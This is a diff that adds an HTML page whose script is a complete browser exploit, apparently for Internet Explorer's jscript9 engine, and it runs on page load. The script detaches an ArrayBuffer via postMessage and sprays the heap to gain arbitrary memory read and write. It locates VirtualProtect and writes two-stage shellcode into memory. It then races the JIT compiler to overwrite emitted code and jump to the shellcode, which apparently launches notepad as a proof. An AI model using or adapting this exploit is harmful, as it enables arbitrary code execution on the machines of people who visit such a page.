@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      var arr = new Array(100000);
+      var ab2 = new ArrayBuffer(0x1337);
+      // first stage shellcode
+      // calls VirtualProtect to mark second stage RWX
+      // then jumps to second stage
+      var scbytes = new Array(0xbe, 0x41, 0x41, 0x41, 0x41, 0xb9, 0x41, 0x41, 0x41, 0x41, 0x54, 0x6a, 0x40, 0x6a, 0x7f, 0x56, 0xff, 0x11, 0xff, 0xe6);
+      var scarray = new Uint8Array(new Array(scbytes.length));
+      scarray.set(scbytes, 0);
+
+      function sprayHeap() {
+        for (var i = 0; i < 10000; i++) {
+          arr[i] = new Uint8Array(ab2);
+        }
+      }
+
+      function pwn() {
+        var lengthIdx;
+        var mv;
+        var jscript9Base;
+        var ab = new ArrayBuffer(1024*1024*2);
+        var ia = new Int8Array(ab);
+        detach(ab);
+        setTimeout(main, 500, ia);
+
+        function detach(ab) {
+          postMessage("", "*", [ab]);
+        }
+
+        function ub(sb) {
+          return (sb < 0) ? sb + 0x100 : sb;
+        }
+
+        function setAddress(addr) {
+          ia[lengthIdx + 4] = addr & 0xFF;
+          ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
+          ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
+          ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
+        }
+
+        function readN(addr, n) {
+          if (n != 4 && n != 8)
+            return 0;
+          setAddress(addr);
+          var ret = 0;
+          for (var i = 0; i < n; i++)
+            ret |= (mv[i] << (i * 8))
+          return ret;
+        }
+
+        function writeN(addr, val, n) {
+          if (n != 2 && n != 4 && n != 8)
+            return;
+          setAddress(addr);
+          for (var i = 0; i < n; i++)
+            mv[i] = (val >> (i * 8)) & 0xFF
+        }
+
+        function main(ia) {
+          sprayHeap();
+          for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00; i++)
+          {
+            if (ia[i] === undefined) {
+              window.alert(':( ' + i.toString());
+            }
+          }
+          ia[i]++;
+          lengthIdx = i;
+          try {
+            for (var i = 0; arr[i].length != 0x1338; i++);
+          } catch (e) {
+            window.alert(':( ' + i.toString());
+          }
+
+          mv = arr[i];
+          var shcodeAddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 + 2]) << 16 | ub(ia[lengthIdx + 4 + 3]) << 24;
+          var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1b]) << 8 | ub(ia[lengthIdx - 0x1a]) << 16 | ub(ia[lengthIdx - 0x19]) << 24;
+          jscript9Base = (vtable - 0x1BC2C) & 0xFFFF0000;
+          var vpaddr = jscript9Base + 0x0034a114;
+
+          // fix addresses in first stage shellcode
+          scbytes[1] = (shcodeAddr>>0) & 0xff;
+          scbytes[2] = (shcodeAddr>>8) & 0xff;
+          scbytes[3] = (shcodeAddr>>16) & 0xff;
+          scbytes[4] = (shcodeAddr>>24) & 0xff;
+          scbytes[6] = (vpaddr>>0) & 0xff;
+          scbytes[7] = (vpaddr>>8) & 0xff;
+          scbytes[8] = (vpaddr>>16) & 0xff;
+          scbytes[9] = (vpaddr>>24) & 0xff;
+
+          // second stage shellcode that will be vprot'd RWX
+          var stage2 = [
+            0x0089E8FC, 0x89600000, 0x64D231E5, 0x8B30528B, 0x528B0C52, 0x28728B14, 0x264AB70F, 0xC031FF31,
+            0x7C613CAC, 0xC1202C02, 0xC7010DCF, 0x5752F0E2, 0x8B10528B, 0xD0013C42, 0x8578408B, 0x014A74C0,
+            0x488B50D0, 0x20588B18, 0x3CE3D301, 0x8B348B49, 0xFF31D601, 0xC1ACC031, 0xC7010DCF, 0xF475E038,
+            0x3BF87D03, 0xE275247D, 0x24588B58, 0x8B66D301, 0x588B4B0C, 0x8BD3011C, 0xD0018B04, 0x24244489,
+            0x59615B5B, 0xE0FF515A, 0x8B5A5F58, 0x5D86EB12, 0x858D016A, 0x000000B9, 0x8B316850, 0xD5FF876F,
+            0x320EFEBB, 0x95A668EA, 0xD5FF9DBD, 0x0A7C063C, 0x75E0FB80, 0x1347BB05, 0x006A6F72, 0x6ED5FF53,
+            0x7065746F, 0x652E6461, 0x00006578
+          ];
+          for (var i = 0; i < stage2.length; i++)
+            writeN(shcodeAddr + i * 4, stage2[i], 4);
+
+          // The plan:
+          // - trigger JIT
+          // - find JIT buffer
+          // - modify JIT buffer
+
+          // construct a "large" function
+          // XXX this could be improved
+          var code = "var i = 10; var j = 1; ";
+          for (var i = 0; i < 6000; i++)
+          {
+            code += "i *= i + j.toString();";
+          }
+          code += "return i.toString();"
+          f = Function(code);
+
+          // find the ThreadContext
+          var tctx = readN(jscript9Base + 0x00349034, 4);
+          // BackgroundJobProcessor
+          var bgjob = readN(tctx + 0x3b0, 4);
+          // PageAllocator
+          var pgalloc = bgjob + 0x1c;
+
+          var buf;
+          var race = function() {
+            // find the large segment (should be exactly one)
+            var largeseg = readN(pgalloc + 0x24, 4);
+            // check if the list was empty
+            if (largeseg == pgalloc + 0x24) return false;
+            // get the address of the actual data
+            var page = readN(largeseg + 8 + 8, 4);
+            if (page == 0) return false;
+            buf = page + 0x18;
+
+            // overwrite the emitted instructions
+            // but avoid overwriting addresses that will be relocated
+            setAddress(buf);
+            mv[0] = 0xeb;
+            mv[1] = 0x34;
+            setAddress(buf + 0x36);
+            mv.set(scbytes, 0);
+            return true;
+          };
+          for (var i = 0; i < 1000; i++)
+          {
+            // warm-up
+            race();
+          }
+          for (var i = 0; i < 1000; i++)
+          {
+            // trigger jit
+            f.call();
+          }
+          while (!race())
+          {
+            // wait until we overwrite in-progress jit block
+          }
+          for (var i = 0; i < 1000; i++)
+          {
+            // call overwritten jit block
+            f.call();
+          }
+        }
+      }
+
+      setTimeout(pwn, 50);
+    </script>
+  </body>
+</html>
